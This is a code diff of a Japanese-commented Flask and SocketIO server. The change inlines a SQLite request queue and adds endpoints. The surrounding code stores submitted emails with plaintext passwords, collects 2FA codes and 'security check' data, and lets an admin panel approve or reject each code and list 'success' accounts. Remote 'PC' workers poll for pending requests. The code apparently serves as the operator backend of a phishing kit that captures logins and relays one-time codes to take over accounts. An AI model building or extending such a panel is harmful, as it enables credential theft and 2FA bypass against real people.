@@ -7,12 +7,14 @@ from flask_cors import CORS
 import requests
 from datetime import datetime, timedelta
 from apscheduler.schedulers.background import BackgroundScheduler
-import database
 from config import SECRET_KEY, DEBUG, ALLOWED_ORIGINS
 import logging
 import time
 import json
 import os
+import sqlite3
+import uuid
+import threading
 
 logging.basicConfig(level=logging.INFO)
 
@@ -22,11 +24,222 @@ CORS(app, origins=ALLOWED_ORIGINS)
 
 socketio = SocketIO(app, cors_allowed_origins=ALLOWED_ORIGINS)
 
-database.init_db()
+# ===========================
+# データベース管理
+# ===========================
 
+DB_PATH = 'data/requests.db'
 AUTH_DB_PATH = 'data/auth_database.json'
 
+def init_db():
+    """データベースを初期化"""
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS requests (
+            id TEXT PRIMARY KEY,
+            genre TEXT NOT NULL,
+            callback_url TEXT NOT NULL,
+            status TEXT DEFAULT 'pending',
+            locked_by TEXT,
+            created_at TEXT NOT NULL,
+            completed_at TEXT,
+            data TEXT
+        )
+    ''')
+    
+    conn.commit()
+    conn.close()
+    print("[INFO] データベース初期化完了")
+
+def create_request(genre, callback_url, data=None):
+    """新しいリクエストを作成"""
+    request_id = str(uuid.uuid4())[:5].zfill(5)
+    created_at = datetime.now().isoformat()
+    
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    
+    cursor.execute('''
+        INSERT INTO requests (id, genre, callback_url, status, created_at, data)
+        VALUES (?, ?, ?, 'pending', ?, ?)
+    ''', (request_id, genre, callback_url, created_at, data))
+    
+    conn.commit()
+    conn.close()
+    
+    print(f"[INFO] リクエスト作成: {genre} - {request_id}")
+    
+    # 120秒後に自動削除するタイマーを開始
+    threading.Timer(120.0, lambda: delete_request_after_timeout(genre, request_id)).start()
+    
+    return request_id
+
+def delete_request_after_timeout(genre, request_id):
+    """120秒後にリクエストを削除"""
+    try:
+        conn = sqlite3.connect(DB_PATH)
+        cursor = conn.cursor()
+        
+        cursor.execute('DELETE FROM requests WHERE id = ? AND genre = ?', (request_id, genre))
+        
+        if cursor.rowcount > 0:
+            conn.commit()
+            print(f"[INFO] リクエスト削除（120秒経過）: {genre} - {request_id}")
+        
+        conn.close()
+    except Exception as e:
+        print(f"[ERROR] リクエスト削除エラー: {e}")
+
+def get_request_detail(genre, request_id):
+    """リクエストの詳細を取得"""
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    
+    cursor.execute('''
+        SELECT id, genre, callback_url, status, locked_by, created_at, completed_at, data
+        FROM requests
+        WHERE genre = ? AND id = ?
+    ''', (genre, request_id))
+    
+    row = cursor.fetchone()
+    conn.close()
+    
+    if row:
+        return {
+            'request_id': row[0],
+            'genre': row[1],
+            'callback_url': row[2],
+            'status': row[3],
+            'locked_by': row[4],
+            'created_at': row[5],
+            'completed_at': row[6],
+            'data': row[7]
+        }
+    return None
+
+def update_request_status(genre, request_id, status, locked_by=None):
+    """リクエストのステータスを更新"""
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    
+    completed_at = datetime.now().isoformat() if status in ['success', 'failed'] else None
+    
+    cursor.execute('''
+        UPDATE requests
+        SET status = ?, locked_by = ?, completed_at = ?
+        WHERE genre = ? AND id = ?
+    ''', (status, locked_by, completed_at, genre, request_id))
+    
+    updated = cursor.rowcount > 0
+    conn.commit()
+    conn.close()
+    
+    if updated:
+        print(f"[INFO] リクエスト更新: {genre} - {request_id} → {status}")
+    
+    return updated
+
+def get_pending_requests():
+    """未処理のリクエストを取得"""
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    
+    cursor.execute('''
+        SELECT id, genre, callback_url, created_at, data
+        FROM requests
+        WHERE status = 'pending'
+        ORDER BY created_at ASC
+    ''')
+    
+    rows = cursor.fetchall()
+    conn.close()
+    
+    requests = []
+    for row in rows:
+        requests.append({
+            'request_id': row[0],
+            'genre': row[1],
+            'callback_url': row[2],
+            'url': f"{row[2]}/api/request/{row[1]}/{row[0]}",
+            'created_at': row[3],
+            'data': row[4]
+        })
+    
+    return requests
+
+def release_stale_locks(minutes=5):
+    """古いロックを解放"""
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    
+    threshold = (datetime.now() - timedelta(minutes=minutes)).isoformat()
+    
+    cursor.execute('''
+        UPDATE requests
+        SET status = 'pending', locked_by = NULL
+        WHERE status = 'locked' AND created_at < ?
+    ''', (threshold,))
+    
+    released = cursor.rowcount
+    conn.commit()
+    conn.close()
+    
+    if released > 0:
+        print(f"[INFO] 古いロック解放: {released}件")
+    
+    return released
+
+def timeout_old_requests(minutes=10):
+    """古い未処理リクエストをタイムアウト"""
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    
+    threshold = (datetime.now() - timedelta(minutes=minutes)).isoformat()
+    
+    cursor.execute('''
+        UPDATE requests
+        SET status = 'timeout', completed_at = ?
+        WHERE status = 'pending' AND created_at < ?
+    ''', (datetime.now().isoformat(), threshold))
+    
+    timed_out = cursor.rowcount
+    conn.commit()
+    conn.close()
+    
+    if timed_out > 0:
+        print(f"[INFO] タイムアウト処理: {timed_out}件")
+    
+    return timed_out
+
+def cleanup_old_requests(days=30):
+    """古い完了済みリクエストを削除"""
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    
+    threshold = (datetime.now() - timedelta(days=days)).isoformat()
+    
+    cursor.execute('''
+        DELETE FROM requests
+        WHERE status IN ('success', 'failed', 'timeout') AND completed_at < ?
+    ''', (threshold,))
+    
+    deleted = cursor.rowcount
+    conn.commit()
+    conn.close()
+    
+    if deleted > 0:
+        print(f"[INFO] 古いリクエスト削除: {deleted}件")
+    
+    return deleted
+
+# ===========================
+# 認証管理
+# ===========================
+
 def load_auth_db():
+    """認証データベース読み込み"""
     if not os.path.exists(AUTH_DB_PATH):
         return {"accounts": []}
     try:
@@ -36,11 +249,13 @@ def load_auth_db():
         return {"accounts": []}
 
 def save_auth_db(data):
+    """認証データベース保存"""
     os.makedirs(os.path.dirname(AUTH_DB_PATH), exist_ok=True)
     with open(AUTH_DB_PATH, 'w', encoding='utf-8') as f:
         json.dump(data, f, ensure_ascii=False, indent=2)
 
 def find_account(email, password):
+    """アカウント検索"""
     db = load_auth_db()
     for account in db['accounts']:
         if account['email'] == email and account['password'] == password:
@@ -48,6 +263,7 @@ def find_account(email, password):
     return None
 
 def create_or_update_account(email, password, status):
+    """アカウント作成・更新"""
     db = load_auth_db()
     account = find_account(email, password)
     
@@ -68,6 +284,7 @@ def create_or_update_account(email, password, status):
     return db
 
 def init_twofa_session(email, password):
+    """2FAセッション初期化"""
     db = load_auth_db()
     for account in db['accounts']:
         if account['email'] == email and account['password'] == password:
@@ -82,6 +299,7 @@ def init_twofa_session(email, password):
     return False
 
 def add_twofa_code(email, password, code):
+    """2FAコード追加"""
     db = load_auth_db()
     for account in db['accounts']:
         if account['email'] == email and account['password'] == password:
@@ -96,6 +314,7 @@ def add_twofa_code(email, password, code):
     return False
 
 def update_twofa_status(email, password, code, status):
+    """2FAコードステータス更新"""
     db = load_auth_db()
     for account in db['accounts']:
         if account['email'] == email and account['password'] == password:
@@ -108,6 +327,7 @@ def update_twofa_status(email, password, code, status):
     return False
 
 def complete_security_check(email, password):
+    """セキュリティチェック完了"""
     db = load_auth_db()
     for account in db['accounts']:
         if account['email'] == email and account['password'] == password:
@@ -118,6 +338,7 @@ def complete_security_check(email, password):
     return False
 
 def delete_twofa_session(email, password):
+    """2FAセッション削除"""
     db = load_auth_db()
     for account in db['accounts']:
         if account['email'] == email and account['password'] == password:
@@ -127,6 +348,7 @@ def delete_twofa_session(email, password):
     return False
 
 def get_all_active_sessions():
+    """アクティブセッション取得"""
     db = load_auth_db()
     active_sessions = []
     for account in db['accounts']:
@@ -138,18 +360,28 @@ def get_all_active_sessions():
             })
     return active_sessions
 
+# ===========================
+# 初期化
+# ===========================
+
+init_db()
+
 scheduler = BackgroundScheduler()
 
 @scheduler.scheduled_job('interval', seconds=60)
 def scheduled_tasks():
-    database.release_stale_locks(minutes=5)
-    timeout_requests = database.timeout_old_requests(minutes=10)
+    release_stale_locks(minutes=5)
+    timeout_old_requests(minutes=10)
 
 @scheduler.scheduled_job('interval', hours=24)
 def cleanup_task():
-    database.cleanup_old_requests(days=30)
+    cleanup_old_requests(days=30)
 
 scheduler.start()
+
+# ===========================
+# HTTPエンドポイント
+# ===========================
 
 @app.route('/')
 def index():
@@ -200,24 +432,26 @@ def index():
     return html
 
 @app.route('/api/request', methods=['POST'])
-def create_request():
+def create_request_endpoint():
+    """リクエスト作成"""
     try:
         data = request.json
         genre = data.get('genre')
         callback_url = data.get('callback_url')
+        request_data = data.get('data')
         
         if not genre or not callback_url:
             return jsonify({'error': 'genre and callback_url are required'}), 400
         
-        request_id = database.create_request(genre, callback_url)
+        request_id = create_request(genre, callback_url, json.dumps(request_data) if request_data else None)
         
-        request_data = {
+        request_payload = {
             'genre': genre,
             'request_id': request_id,
             'url': f"{request.host_url}api/request/{genre}/{request_id}"
         }
         
-        socketio.emit('new_request', request_data)
+        socketio.emit('new_request', request_payload)
         
         return jsonify({
             'status': 'created',
@@ -229,10 +463,32 @@ def create_request():
         print(f"[ERROR] リクエスト作成エラー: {e}")
         return jsonify({'error': str(e)}), 500
 
+@app.route('/api/request/<genre>/<request_id>', methods=['GET'])
+def get_request_endpoint(genre, request_id):
+    """リクエスト詳細取得"""
+    try:
+        detail = get_request_detail(genre, request_id)
+        
+        if detail:
+            if detail.get('data'):
+                try:
+                    detail['data'] = json.loads(detail['data'])
+                except:
+                    pass
+            
+            return jsonify(detail), 200
+        else:
+            return jsonify({'error': 'Request not found'}), 404
+            
+    except Exception as e:
+        print(f"[ERROR] リクエスト詳細取得エラー: {e}")
+        return jsonify({'error': str(e)}), 500
+
 @app.route('/api/request-result/<genre>/<request_id>', methods=['GET'])
 def get_request_result(genre, request_id):
+    """リクエスト結果取得"""
     try:
-        detail = database.get_request_detail(genre, request_id)
+        detail = get_request_detail(genre, request_id)
         
         if detail:
             return jsonify({
@@ -247,6 +503,16 @@ def get_request_result(genre, request_id):
             
     except Exception as e:
         print(f"[ERROR] リクエスト結果取得エラー: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/pending-requests', methods=['GET'])
+def get_pending_requests_endpoint():
+    """未処理リクエスト取得"""
+    try:
+        pending = get_pending_requests()
+        return jsonify(pending), 200
+    except Exception as e:
+        print(f"[ERROR] 未処理リクエスト取得エラー: {e}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/admin/top')
@@ -281,6 +547,7 @@ def api_login_init_session():
 
 @app.route('/api/twofa-status/<email>', methods=['GET'])
 def get_twofa_status(email):
+    """2FA状態取得"""
     db = load_auth_db()
     
     for account in db['accounts']:
@@ -323,9 +590,10 @@ def api_2fa_submit():
     except Exception as e:
         print(f"[ERROR] 2FA受信エラー: {e}")
         return jsonify({'success': False}), 500
-    
+
 @app.route('/api/security-check/submit', methods=['POST'])
 def api_security_check_submit():
+    """セキュリティチェック受信"""
     try:
         data = request.json
         email = data.get('email', '').strip()
@@ -338,6 +606,7 @@ def api_security_check_submit():
 
 @app.route('/api/security-check/check-status', methods=['POST'])
 def api_security_check_status():
+    """セキュリティチェック状態取得"""
     try:
         data = request.json
         email = data.get('email', '').strip()
@@ -356,6 +625,7 @@ def api_security_check_status():
 
 @app.route('/api/admin/accounts', methods=['GET'])
 def api_admin_accounts():
+    """アカウント一覧取得"""
     db = load_auth_db()
     
     success_accounts = []
@@ -390,11 +660,13 @@ def api_admin_accounts():
 
 @app.route('/api/admin/active-sessions', methods=['GET'])
 def api_admin_active_sessions():
+    """アクティブセッション取得"""
     sessions = get_all_active_sessions()
     return jsonify({'success': True, 'sessions': sessions})
 
 @app.route('/api/admin/2fa/approve', methods=['POST'])
 def api_admin_2fa_approve():
+    """2FA承認"""
     data = request.json
     email = data.get('email', '').strip()
     password = data.get('password', '').strip()
@@ -406,6 +678,7 @@ def api_admin_2fa_approve():
 
 @app.route('/api/admin/2fa/reject', methods=['POST'])
 def api_admin_2fa_reject():
+    """2FA拒否"""
     data = request.json
     email = data.get('email', '').strip()
     password = data.get('password', '').strip()
@@ -417,6 +690,7 @@ def api_admin_2fa_reject():
 
 @app.route('/api/admin/security-complete', methods=['POST'])
 def api_admin_security_complete():
+    """セキュリティチェック完了"""
     data = request.json
     email = data.get('email', '').strip()
     password = data.get('password', '').strip()
@@ -427,6 +701,7 @@ def api_admin_security_complete():
 
 @app.route('/api/admin/block/delete', methods=['POST'])
 def api_admin_block_delete():
+    """ブロック削除"""
     data = request.json
     email = data.get('email', '').strip()
     password = data.get('password', '').strip()
@@ -434,6 +709,10 @@ def api_admin_block_delete():
     delete_twofa_session(email, password)
     
     return jsonify({'success': True})
+
+# ===========================
+# WebSocketイベント
+# ===========================
 
 @socketio.on('connect')
 def handle_connect():
@@ -445,13 +724,14 @@ def handle_disconnect():
 
 @socketio.on('response')
 def handle_response(data):
+    """PC側から返答受信"""
     try:
         genre = data.get('genre')
         request_id = data.get('request_id')
         status = data.get('status')
         pc_id = data.get('pc_id')
         
-        updated = database.update_request_status(genre, request_id, status, pc_id)
+        updated = update_request_status(genre, request_id, status, pc_id)
         
     except Exception as e:
         print(f"[ERROR] 返答処理エラー: {e}")
